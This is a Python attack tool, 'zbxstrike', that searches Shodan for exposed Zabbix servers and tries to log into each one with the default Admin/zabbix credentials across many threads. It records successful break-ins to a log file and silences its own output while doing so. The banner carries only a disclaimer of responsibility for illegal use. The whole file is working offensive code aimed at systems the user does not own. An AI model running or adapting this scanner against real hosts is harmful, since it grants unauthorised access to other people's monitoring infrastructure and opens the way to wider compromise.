import shodan
import argparse
import os
import sys

from time import sleep
from zabbix_api import ZabbixAPI
from multiprocessing.dummy import Pool as ThreadPool 

class zbxstrike():
    def __init__(self, api_key, thread):
        self.api = shodan.Shodan(api_key)
        self.thread = thread

    def search(self):
        targets_list = []

        try:
            results = self.api.search('zabbix')            
            for result in results['matches']:
                targets_list.append(result['ip_str'])

        except shodan.APIError:
            pass

        return targets_list

    def print_success(self, msg):
        with open('log.txt', 'a+') as log:
            log.write(msg + '\n')

    def test_login(self, host):
        try:
            zapi = ZabbixAPI(server="http://{0}/zabbix".format(host),
                             timeout=5)

            zapi.login("Admin", "zabbix")
            msg = "[success] -\t {0} \t- User: Admin - Password: zabbix".format(host)
            self.print_success(msg)
        except:
            pass

    def attack(self):
        targets = self.search()
        pool = ThreadPool(self.thread)

        print("--------------------------------------------------------------")
        print("[INFO] Number of targets: {0}".format(len(targets)))
        print("[INFO] Number of threads: {0}".format(self.thread))
        print("[INFO] Generate log.txt in {0}/log.txt".format(os.getcwd()))
        print("[INFO] Working...")
        print("--------------------------------------------------------------")

        sys.stdout = open('/dev/null', 'w')
        results = pool.map(self.test_login, targets)
        pool.close()
        pool.join()

def banner():
    banner = '''

███████╗██████╗ ██╗  ██╗███████╗████████╗██████╗ ██╗██╗  ██╗███████╗██████╗ 
╚══███╔╝██╔══██╗╚██╗██╔╝██╔════╝╚══██╔══╝██╔══██╗██║██║ ██╔╝██╔════╝██╔══██╗
  ███╔╝ ██████╔╝ ╚███╔╝ ███████╗   ██║   ██████╔╝██║█████╔╝ █████╗  ██████╔╝
 ███╔╝  ██╔══██╗ ██╔██╗ ╚════██║   ██║   ██╔══██╗██║██╔═██╗ ██╔══╝  ██╔══██╗
███████╗██████╔╝██╔╝ ██╗███████║   ██║   ██║  ██║██║██║  ██╗███████╗██║  ██║
╚══════╝╚═════╝ ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

Author:     Gabriel Dutra
Github:     github.com/zer0dx
Blog:       https://zer0dx.github.io
Email:      gmdutra.root@gmail.com
Linkedin:   https://linkedin.com/in/zer0dx

Date: 8/04/2019

I am not responsible for the illegal use of the tool :)
    '''
    print(banner)

def main():

    parser = argparse.ArgumentParser()
    parser.add_argument('-k', '--key', dest="key", help="Your key for shodan", required=True)
    parser.add_argument('-t', '--thread', dest="thread", help="Number of the threads", default=4, required=False)
    args = parser.parse_args()

    key = args.key 
    thread = int(args.thread)

    zbx = zbxstrike(key, thread)
    zbx.attack()

if __name__=='__main__':
    banner()
    sleep(3)
    main()
